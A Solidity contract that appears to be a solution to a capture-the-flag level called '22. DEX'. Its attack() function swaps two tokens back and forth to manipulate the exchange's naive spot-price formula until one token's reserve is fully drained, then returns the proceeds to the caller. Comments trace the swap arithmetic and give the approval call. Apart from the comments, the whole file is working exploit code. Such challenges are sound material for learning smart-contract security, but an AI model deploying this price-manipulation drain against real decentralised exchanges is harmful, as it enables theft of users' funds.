// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title 22. DEX
 * @dev Drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.
 */

interface IDex {
    function token1() external returns (address);

    function token2() external returns (address);

    function swap(address from, address to, uint256 amount) external;

    function approve(address spender, uint256 amount) external;

    function balanceOf(
        address token,
        address account
    ) external view returns (uint256);
}

/*
 * 0. Approve the newly deployed contract to transfer token1 & token2
 * --------------------------------------------------------------------
 * await contract.approve("0x63756907c4b701acE7B29E3Fc8cCaFF5fd98b54e", "100000000000000000000");
 */

contract Dexter {
    IDex private dex;
    address private immutable token1;
    address private immutable token2;

    constructor(address _dex) {
        dex = IDex(_dex);
        token1 = dex.token1();
        token2 = dex.token2();
    }

    function attack() public {
        // 1. Transfer all tokens to the contract (!!! Require approval for this to work !!!)
        IERC20(token1).transferFrom(msg.sender, address(this), 10);
        IERC20(token2).transferFrom(msg.sender, address(this), 10);

        // 2. Swap the tokens multiple times to profit from the "artificial" price
        dex.approve(address(dex), type(uint256).max);
        _swap(token1, token2); // 10 in | 100 - 100 | 10 out (10*100/100 = 10)
        _swap(token2, token1); // 20 in | 110 - 90  | 24 out (20*110/90 = 24)
        _swap(token1, token2); // 24 in | 86  - 110 | 30 out (24*110/86 = 30)
        _swap(token2, token1); // 30 in | 110  - 80 | 41 out (30*110/80 = 41)
        _swap(token1, token2); // 41 in | 69  - 110 | 65 out (41*110/67 = 65)

        // 3. Final swap with the exact amount to empty the reserves of token1
        // x in | 110 - 45 | 110 out (x*110/45 = 110)
        // x = 110*45/110 = 45
        dex.swap(token2, token1, 45);

        // 4. Transfer tokens back
        IERC20(token1).transfer(
            msg.sender,
            dex.balanceOf(token1, address(this))
        );
        IERC20(token2).transfer(
            msg.sender,
            dex.balanceOf(token2, address(this))
        );

        require(
            dex.balanceOf(address(token1), address(dex)) == 0,
            "Attack failed!"
        );
    }

    function _swap(address tokenIn, address tokenOut) private {
        uint256 amount = dex.balanceOf(tokenIn, address(this));
        dex.swap(tokenIn, tokenOut, amount);
    }
}
